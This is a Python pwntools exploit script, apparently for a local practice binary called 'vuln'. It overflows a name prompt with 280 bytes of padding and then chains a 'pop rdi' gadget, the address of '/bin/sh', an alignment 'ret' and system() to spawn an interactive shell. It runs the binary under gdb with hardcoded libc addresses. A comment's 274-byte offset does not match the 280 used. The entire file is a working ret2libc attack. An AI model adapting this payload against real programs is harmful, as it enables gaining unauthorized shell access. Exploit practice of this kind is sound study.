#!/usr/bin/env python3
from pwn import *

context.terminal = ["wezterm", "start", "--"]

# we overflow saved rip after 274 bytes
overflow_offset_rip = 280

# we point rip to system
system_addr = 0x7FFFF7DF1400  # `system()` in libc
bin_sh_addr = 0x7FFFF7F4CF24  # `"/bin/sh"` in libc

libc_base = 0x7FFFF7D9E000  # Per vmmap
# [INFO] File: /usr/lib/libc.so.6
# 0x000000000010194a: pop rdi; ret;
pop_rdi_ret_offset = 0x10194A
pop_rdi_ret = libc_base + pop_rdi_ret_offset

# [INFO] File: vuln
# 0x000000000040101a: ret;
ret = 0x000000000040101A

# construct payload
payload = b"A" * overflow_offset_rip
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
# align the stack to 16-bytes so `movaps` instruction in `system()` doesn't crash
payload += p64(ret)
payload += p64(system_addr)

# connect to the vulnerable program
p = process("./vuln")
gdb.attach(p, api=True)

# send payload
p.sendafter(b"Hey, whats your name!?\n", payload)
p.sendafter(b"is this name correct? (y/n)?\n", b"y\n")

p.interactive()
